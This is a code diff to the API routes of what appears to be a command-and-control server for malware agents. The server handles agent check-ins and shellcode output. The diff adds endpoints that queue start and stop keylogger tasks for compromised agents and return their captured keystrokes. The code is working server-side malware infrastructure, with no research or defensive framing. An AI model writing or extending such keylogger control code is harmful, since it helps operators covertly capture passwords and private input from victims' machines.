@@ -114,6 +114,70 @@ def init_api_routes(app, socketio):
             app.logger.error(f"Error processing shellcode output: {str(e)}")
             return jsonify({"status": "error", "message": str(e)}), 500
 
+    # New endpoint to fetch recent keylogger logs for an agent
+    @app.route('/api/keylogger_logs/<string:agent_id>', methods=['GET'])
+    @login_required
+    def get_keylogger_logs(agent_id):
+        try:
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            c.execute('''
+                CREATE TABLE IF NOT EXISTS keylogs (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    agent_id TEXT NOT NULL,
+                    keys TEXT NOT NULL,
+                    timestamp TEXT NOT NULL
+                )
+            ''')
+            c.execute('''
+                SELECT keys, timestamp FROM keylogs
+                WHERE agent_id=?
+                ORDER BY timestamp DESC
+                LIMIT 100
+            ''', (agent_id,))
+            rows = c.fetchall()
+            conn.close()
+            logs = [{'keys': row[0], 'timestamp': row[1]} for row in rows]
+            return jsonify({'status': 'success', 'logs': logs})
+        except Exception as e:
+            app.logger.error(f"Error fetching keylogger logs: {str(e)}")
+            return jsonify({'status': 'error', 'message': str(e)}), 500
+
+    # New endpoint to create start/stop keylogger tasks
+    @app.route('/api/keylogger_task', methods=['POST'])
+    @login_required
+    def create_keylogger_task():
+        try:
+            data = request.get_json()
+            if not data or 'agent_id' not in data or 'action' not in data:
+                return jsonify({'status': 'error', 'message': 'agent_id and action required'}), 400
+            
+            agent_id = data['agent_id']
+            action = data['action']
+            if action not in ['start', 'stop']:
+                return jsonify({'status': 'error', 'message': 'Invalid action'}), 400
+            
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            task_data = {'action': action}
+            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
+                      (None, agent_id, 'keylogger', json.dumps(task_data), 'pending',
+                       datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), None))
+            conn.commit()
+            task_id = c.lastrowid
+            conn.close()
+            
+            socketio.emit('new_task', {
+                'task_id': task_id,
+                'agent_id': agent_id,
+                'task_type': 'keylogger'
+            })
+            
+            return jsonify({'status': 'success', 'task_id': task_id})
+        except Exception as e:
+            app.logger.error(f"Error creating keylogger task: {str(e)}")
+            return jsonify({'status': 'error', 'message': str(e)}), 500
+
     @app.route('/api/checkin', methods=['POST'])
     def agent_checkin():
         conn = None
